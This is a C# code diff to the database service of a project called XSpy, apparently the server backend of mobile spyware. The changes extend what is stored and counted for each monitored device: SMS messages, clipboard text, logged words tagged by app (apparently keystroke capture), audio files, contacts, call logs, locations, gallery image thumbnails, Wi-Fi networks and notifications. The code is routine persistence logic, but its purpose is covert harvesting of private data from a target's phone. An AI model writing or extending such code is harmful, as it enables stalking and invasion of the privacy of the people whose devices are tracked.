@@ -28,18 +28,33 @@ namespace XSpy.Database.Services
         {
         }
 
-        public async Task<DashViewModel> GetDashboardInfo(User loggedUser)
+        public async Task<DashViewModel> GetDashboardInfo(Guid deviceId)
         {
-            var sms = await DbContext.Messages.Where(s => s.DeviceData.UserId == loggedUser.Id).LongCountAsync();
-            var words = await DbContext.Clipboards.Where(s => s.DeviceData.UserId == loggedUser.Id).LongCountAsync();
-            var devices = await DbContext.Devices.Where(s => s.UserId == loggedUser.Id).LongCountAsync();
-            var files = await DbContext.Files.Where(s => s.DeviceData.UserId == loggedUser.Id).LongCountAsync();
+            var sms = await DbContext.Messages.Where(s => s.DeviceId == deviceId).LongCountAsync();
+            var words = await DbContext.Clipboards.Where(s => s.DeviceId == deviceId).LongCountAsync();
+            var files = await DbContext.Files.Where(s => s.DeviceId == deviceId && s.FileType != "audio")
+                .LongCountAsync();
+            var audios = await DbContext.Files.Where(s => s.DeviceId == deviceId && s.FileType == "audio")
+                .LongCountAsync();
+            var contacts = await DbContext.Contacts.Where(s => s.DeviceId == deviceId).LongCountAsync();
+            var calls = await DbContext.Calls.Where(s => s.DeviceId == deviceId).LongCountAsync();
+            var locations = await DbContext.Locations.Where(s => s.DeviceId == deviceId).LongCountAsync();
+            var images = await DbContext.ImageList.Where(s => s.DeviceId == deviceId).LongCountAsync();
+            var wifi = await DbContext.WifiList.Where(s => s.DeviceId == deviceId).LongCountAsync();
+
             return new DashViewModel()
             {
-                Devices = devices,
                 Files = files,
                 Messages = sms,
-                Words = words
+                Words = words,
+                Audios = audios,
+                BatteryLevel = 100,
+                Contacts = contacts,
+                Calls = calls,
+                Locations = locations,
+                Photos = images,
+                WhatsApp = 10,
+                WifiCount = wifi
             };
         }
 
@@ -225,32 +240,74 @@ namespace XSpy.Database.Services
             await DbContext.SaveChangesAsync();
         }
 
-        public async Task ImageList(string deviceId, List<string> paths)
+        public async Task SaveImageThumb(string deviceId, string thumbUrl, string imagePath)
+        {
+            var device =
+                await DbContext.Devices.Where(s => s.DeviceId == deviceId)
+                    .Select(s => s.Id)
+                    .FirstOrDefaultAsync();
+            if (device == Guid.Empty)
+                return;
+
+            var imageFile =
+                await DbContext.ImageList.FirstOrDefaultAsync(s => s.OriginalPath == imagePath && s.DeviceId == device);
+            if (imageFile != null)
+            {
+                imageFile.ThumbPath = thumbUrl;
+                DbContext.ImageList.Update(imageFile);
+                await DbContext.SaveChangesAsync();
+            }
+        }
+
+
+        public async Task<List<SaveGalleryRequest>> ImageList(string deviceId, List<SaveGalleryRequest> paths)
         {
             var device =
                 await DbContext.Devices.Where(s => s.DeviceId == deviceId)
                     .FirstOrDefaultAsync();
             if (device.Id == Guid.Empty)
-                return;
+                return new List<SaveGalleryRequest>(0);
 
             device.IsLoadingDir = false;
             DbContext.Update(device);
 
-            DbContext.ImageList.RemoveRange(DbContext.ImageList.Where(s => s.DeviceId == device.Id));
+            var needThumb = new List<SaveGalleryRequest>();
+
             foreach (var pathData in paths)
             {
+                var exits = await DbContext.ImageList.Where(s =>
+                        s.OriginalPath == pathData.Path && s.DeviceId == device.Id)
+                    .Select(s => new {s.Id, s.ThumbPath}).FirstOrDefaultAsync();
+                if (exits != null)
+                {
+                    if (string.IsNullOrEmpty(exits.ThumbPath))
+                    {
+                        needThumb.Add(pathData);
+                    }
+
+                    continue;
+                }
+
+                if (await DbContext.ImageList.AnyAsync(s => s.OriginalPath == pathData.Path && s.DeviceId == device.Id))
+                    continue;
+
                 var data = new FileList()
                 {
                     Id = Guid.NewGuid(),
                     CratedAt = DateTime.Now,
                     DeviceId = device.Id,
-                    OriginalPath = pathData
+                    OriginalPath = pathData.Path,
+                    FileId = pathData.ImageId
                 };
+
+                needThumb.Add(pathData);
 
                 await DbContext.AddAsync(data);
             }
 
             await DbContext.SaveChangesAsync();
+
+            return needThumb;
         }
 
         public async Task StoreMessages(string deviceId, List<ListSmsData> listSms)
@@ -306,9 +363,6 @@ namespace XSpy.Database.Services
                 return fileExists;
             }
 
-            var name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 12) + transferFile.Name;
-
-
             var file = new File()
             {
                 Id = Guid.NewGuid(),
@@ -317,7 +371,7 @@ namespace XSpy.Database.Services
                 OriginalName = transferFile.Name,
                 OriginalPath = transferFile.Path,
                 FileType = transferFile.Type,
-                SavedPath = Path.Combine(savePath, device.ToString(), transferFile.Type, name)
+                SavedPath = savePath
             };
 
             await DbContext.Files.AddAsync(file);
@@ -370,11 +424,12 @@ namespace XSpy.Database.Services
 
             var checkNotify = await
                 DbContext.Notifications.AnyAsync(s =>
-                    s.DeviceId == device && s.Date == DateTime.Now && s.Content == dataRequest.Content && s.Title == dataRequest.Title);
+                    s.DeviceId == device && s.Date == DateTime.Now && s.Content == dataRequest.Content &&
+                    s.Title == dataRequest.Title);
 
             if (checkNotify)
                 return;
-            
+
             await DbContext.Notifications.AddAsync(new Notification()
             {
                 Id = Guid.NewGuid(),
@@ -469,7 +524,7 @@ namespace XSpy.Database.Services
                     CratedAt = DateTime.Now,
                     DeviceId = device,
                     Bssid = requestNetwork.BSSID,
-                    Ssid = requestNetwork.BSSID
+                    Ssid = requestNetwork.SSID
                 };
 
                 await DbContext.AddAsync(entry);
@@ -510,7 +565,6 @@ namespace XSpy.Database.Services
             await DbContext.SaveChangesAsync();
         }
 
-
         public async Task SaveLocation(string deviceId, UpdatePositionRequest request)
         {
             var device =
@@ -536,7 +590,7 @@ namespace XSpy.Database.Services
             await DbContext.SaveChangesAsync();
         }
 
-        public async Task SaveWords(string deviceId, string word, bool isClipboard)
+        public async Task SaveWords(string deviceId, string word, string appName, bool isClipboard)
         {
             var device =
                 await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
@@ -562,6 +616,7 @@ namespace XSpy.Database.Services
                     Id = Guid.NewGuid(),
                     DeviceId = device,
                     CratedAt = DateTime.Now,
+                    AppName = appName,
                     Content = word,
                     IsClipboard = isClipboard
                 };
